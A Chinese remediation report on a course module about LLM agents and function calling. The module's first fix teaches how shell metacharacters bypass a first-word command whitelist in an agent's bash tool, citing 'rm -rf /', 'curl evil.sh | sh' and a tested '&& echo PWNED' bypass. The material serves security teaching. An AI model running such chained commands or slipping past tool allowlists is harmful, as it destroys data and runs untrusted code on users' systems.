# T2 整改报告 · Part 19（Agent / Function Calling）

- 整改日期：2026-09-04 ｜ 执行：T2 整改教师 ｜ REPO 只读，全部修改写入本镜像
- 范围：`courses/Part19_agents/`（tutorial 3 md + scripts 3 py + 新增 images/1 张）、
  `assignments/assignment_19/assignment.md` ｜ 台账：`REVIEW/ledger/ledger_P19.md`
  （21 条 = P0×1 / P1×7 / P2×12 / disputed×1）

## 一、P0（必修 1）：白名单绕过安全课

1. **教程 01 章 2.1**：在"三道闸"之后新增小节 **"白名单为什么不够：shell 元字符
   可以穿透第一词检查"**——反例代码块（`cat /tmp/x && rm -rf /`、
   `cat /tmp/x; curl evil.sh | sh`、命令替换行）+ 病根（只查第一词、`shell=True`
   整串交 shell）+ 生产三出路（`shell=False`+argv 数组 / allowlist 解析每段子命令 /
   容器隔离），并点破陷阱 3 原症状例子"恰好第一词是 rm"的误导性。
2. **陷阱 3**：解法注明"每轮调用数上限"的实现归属（脚本 03 `calls[:3]` 最小实现，
   脚本 01 教学版未加——plan 缺口 #1 一并闭环），症状例补"低级形态 vs 元字符形态"辨析。
3. **脚本 01 `exec_bash`**：白名单放行后检测 `;`/`&&`/`|`/反引号/`$(`，命中则向
   **stderr** 打印 ⚠️ 警告（注明"教学沙箱不改变判定"）。
   - **判定不变的实测证据**：修后脚本 01 stdout 与基线 `diff` 为空——四个 Demo
     轨迹（含 nudge 原话、幻觉检测行）**逐字不变**；唯一警告行在 stderr，来自
     Section 0 超时演示命令 `python -c "import time; time.sleep(30)"`（命中 `;`），
     属预期演示。绕过实证：`exec_bash("cat /tmp/agent_demo.txt && echo PWNED")`
     → 打警告且返回 `'1081PWNED'`（`&&` 后命令真实执行，证明穿透）。
   - 学习目标第 4 条同步改为"白名单为什么'必要但不充分'"。

## 二、必修 2-7（内容级）

- **必修 2（pass^k 进正文）**：02 章 5.1 新增乘法原理段——
  $\text{pass}^k = p^k$（display 公式）+ $0.7^2{=}0.49 \to 0.7^4{≈}0.24 \to
  0.7^8{≈}0.057$ 数字例 + "k 翻倍=平方"直觉 + **HumanEval pass@k 方向相反**
  对照框；折叠 Q3 保持不动（互为印证）。
- **必修 3（离线跑法）**：README"环境"、01 章 §3 环境 blockquote、02 章导语
  三处补 `HF_HUB_OFFLINE=1 TRANSFORMERS_OFFLINE=1`（注明"模型已缓存也崩"的
  ProxyError 实测教训）。三脚本离线复跑 rc=0。
- **必修 4**：①02 章 5.1 判分行补"只查调用出现过、不强制 get_order→refund
  时序"声明并指向练习 2；②02 章 §1 表后新增"MCP 三层"歧义辨析框（协议三层
  MCP/A2A/AGENTS.md vs MCP 自身协议/客户端/服务器，两种问法各自的答案落点）。
- **必修 5（口径与标注）**：`parameters` vs `inputSchema` 外壳差异（02 章 2.1 表 +
  脚本 02 两处注释）；政策"~300 字"→"约 614 字符 / ~100 英文词"（python 实测
  614/100，02 章表格 + 脚本 03 注释同步）；脚本 03 耗时三口径统一为
  **"约 10-25 秒（因机器而异）"**（README/02 章/docstring 三处）；assignment.md
  同名接口声明改 `tool_spec` 名实相符；01 章 4 个代码块 + 02 章脚本 02 实录
  全部标注"节选/示意"（G10×5）。
- **必修 6**：22→15 补对账（head 2 + 标记 1 + tail 12 = 15，01 章 3.5）；90.2%
  注明相对提升口径 + 15×/90.2% 补 2025-06 披露时点（02 章 §4）；方差讨论补
  三条出路（R≥30 谈区间/Wilson·Clopper-Pearson、R=6 复跑、降级定性结论）。
- **必修 7**：README 前置知识 Part 18 条加一句互指"ragflow/llama_index 对比属
  Part 18/A1 范围"。

## 三、必修 8-9（格式与降级核实）

- **G1×2**：01 章 3.4 差距 blockquote、02 章 Cognition 两定律 → 逐行编号拆行。
- **G4**：新增 `courses/Part19_agents/images/pass_at_k_curve.png`（pass^k 衰减
  曲线，p∈{0.5,0.7,0.9}，标注 0.7^8=0.057 与"k 翻倍=平方"），02 章 5.1 嵌入；
  生成脚本 `scratch/T2_P19/make_pass_at_k_fig.py`（matplotlib, Agg）可复现。
- **G14 轻项**：02 章 τ-mini 实测口径补 fp16 + transformers 4.57.6 / torch 2.6.0。
- **降级核实 4 项**：离线不可核 → 02 章参考资源顶部"转述待核"总声明（Pi 博客
  日期/arXiv 编号等）；τ-bench 评分 bug 三处（02 章 + 脚本 03 两处）标"社区流传
  口径（转述待核）"；SWE-bench 80.9% 注明"转述、撰写时点口径、现值未离线复核"。
- **disputed 1 条**：脚本 02 未知工具错误码 -32601 vs S1 主张的 -32602，离线无法
  裁（T-21），联网窗口对照 MCP 错误码表后由 T0 裁决。

## 四、验证记录（全部实测）

| 验证项 | 结果 |
|---|---|
| 脚本 01（scratch，HF_HUB_OFFLINE=1） | 基线 15.3s rc=0；修后 rc=0，**stdout 与基线 diff 逐字一致**（例外=stderr 1 行白名单警告，已说明） |
| 脚本 02 | 基线/修后均 0.03s rc=0，stdout **逐字一致** |
| 脚本 03 | 基线 8.6s rc=0（pass^1=0.00）；修后 7.9s rc=0（pass^1=0.00）——温度采样方差与教程 0.00/0.11 双口径叙事相符，该脚本无 bash 工具、零警告行 |
| 白名单绕过实测 | `cat … && echo PWNED` → stderr ⚠️ + 返回 `'1081PWNED'`（穿透实证，S1 K1 验证项闭环） |
| 作业 pytest（assignment_reference 参考 + test） | **5 passed**（0.01s） |
| check_latex.py（README/01/02/assignment 四个改动 md） | 全部 **0 问题**（期间修复 `$()` 壳层记号被误判公式的 2 行） |

## 五、遗留与移交

- 联网窗口核对清单已追加至 `REVIEW/outline_review/outline_suggestions.md`
  （Pi 博客 URL/日期、smolagents"千行"口径、arXiv×3、τ-bench 评分 bug 的
  PR/commit、SWE-bench 榜现值、MCP 2025 两版 protocolVersion、-32601/-32602 裁决）。
- 顺手项未动（记 outline）：脚本 01/03 print 无 flush、无 CPU 短程档（plan §四附注，
  CPU 学生中断即零输出）——建议加 `flush=True` 或 `DEMOS=0`/`R=1` 环境档。
- roadmap A2 侧无待改项（L555-564 与实体交付对得上）；P17→P19 互指属 P17 侧
  修复（plan_P17 缺口 #6），本 Part 五处 P19→P17 声明已复核在位。
